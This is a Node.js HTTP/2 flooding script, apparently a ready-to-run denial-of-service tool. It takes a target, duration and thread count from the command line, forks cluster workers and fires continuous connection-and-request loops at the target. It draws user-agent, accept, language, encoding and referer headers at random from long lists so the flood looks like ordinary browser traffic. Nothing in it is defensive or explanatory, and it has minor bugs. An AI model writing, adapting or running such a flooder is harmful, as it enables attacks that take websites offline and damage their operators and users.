const http2 = require("http2")
const fakeua = require("fake-useragent")
const tls = require("tls")
const cluster = require("cluster")
const https = require("https")
const http = require("http")
const path = require("path")
const file = process.argv[1]
const name = path.basename(file)
const target = process.argv[2]
const time = process.argv[3]
const thread = process.argv[4]
if ( process.argv.length < 5 ) {
	console.log("Using: node " + name + " [Target] [Time] [Thread]")
	process.exit()
}
const useragent = [
	"Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
	"Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
	"Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
	"Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
	"Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1"
]
const accept_header = [
	    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*',
    'image/avif,image/webp,*/*',
    'image/webp,*/*',
    'image/png,image/*;q=0.8,*/*;q=0.5',
    'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
    'image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
    'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
    'image/png,image/svg+xml,image/*;q=0.8, */*;q=0.5',
    'text/css,*/*;q=0.1',
    'text/css',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
]
accept_language = [
	    "ko-KR",
    "en-US",
    "zh-CN",
    "zh-TW",
    "ja-JP",
    "en-GB",
    "en-AU",
    "en-CA",
    "en-NZ",
    "en-ZA",
    "en-IN",
    "en-PH",
    "en-SG",
    "en-HK",
    "*",
    "en-US,en;q=0.5",
    "utf-8, iso-8859-1;q=0.5, *;q=0.1",
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    "en-GB, en-US, en;q=0.9",
    "de-AT, de-DE;q=0.9, en;q=0.5",
    "cs;q=0.5",
    "da, en-gb;q=0.8, en;q=0.7",
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-US,en;q=0.9",
    "de-CH;q=0.7",
    "tr",
]
const referer = [
	"http://www.google.com",
	"http://bing.com",
	"http://m.facebook.com",
	"http://check-host.net",
	"http://youtube.com",
	"http://microsoft.com",
	"http://mbasic.facebook.com",
	"http://nodejs.com",
	"http://nasa.gov",
	"http://dstat.cc",
	"http://dstat.love",
	"http://vani.ovh",
	"http://github.com",
	"http://one.google.com",
	"http://github.dev",
	"http://vlxx.com",
	"http://chinhphu.vn",
	"http://fbi.gov",
	"http://nodejs.org",
	"https://m.me/j/AbbgIU9AIjdcuPo0/",
	"http://cloudflare.com",
	"http://discord.com",
	"http://gay.com",
	"http://pornhub.com",
	"http://ngu.com",
	"http://ubuntu.com",
	"http://nm2302.site",
	"http:://ngocphong.space",
	"http://onlytris.space",
	"http://paypal.com"
]
const encoding = [
	    "*",
    "gzip, deflate",
    "br;q=1.0, gzip;q=0.8, *;q=0.1",
    "gzip",
    "gzip, compress",
    "compress, deflate",
    "compress",
    "gzip, deflate, br",
    "deflate",
    "gzip, deflate, lzma, sdch",
    "deflate",
]
const lang = accept_language[Math.floor(Math.random()* accept_language.length)]
const ua = useragent[Math.floor(Math.random()* useragent.length)]
const en = encoding[Math.floor(Math.random()* encoding.length)]
const ref = referer[Math.floor(Math.random()* referer.length)]
const acp = accept_header[Math.floor(Math.random()* accept_header.length)]
const agent = new http.Agent({
	KeepAlive: true,
	KeepAliveMsecs: Infinity,
	maxSockets: Infinity,
	maxTotalSockets: Infinity,
})
const options = {
	hostname: target,
	method: "GET",
	timeout: 1000,
	globalAgent: agent,
	path: "/",
	headers: {
		"Connection": "keep-alive",
		"Referer": ref,
		"Accept-language": lang,
		"Accept-encoding": en,
		"User-Agent": ua,
	}
}
function flood() {
	const client = http2.connect(target)
	const req = client.request(options)
	req.on("response", () => {
		const client = http2.connect(target)
		const req = client.request(options)
		req.on("response", () => {
			console.log("Vong lap2")
			req.end()
			return
		})
		req.on("error", () => {
			console.log("Loi vong lap")
			req.destroy()
		})
		req.end()
		return
	})
	req.on("error", () => {
		req.destroy()
		return
	})
}
if ( cluster.isWorker ) {
	setInterval(() => {
		flood()
	})
} else {
	setInterval(() => {
		flood()
	})
	for ( let i = 0; i < thread;i++ ) {
		cluster.fork()
	}
}
setTimeout(() => {
	process.exit()
}, time * 1000)

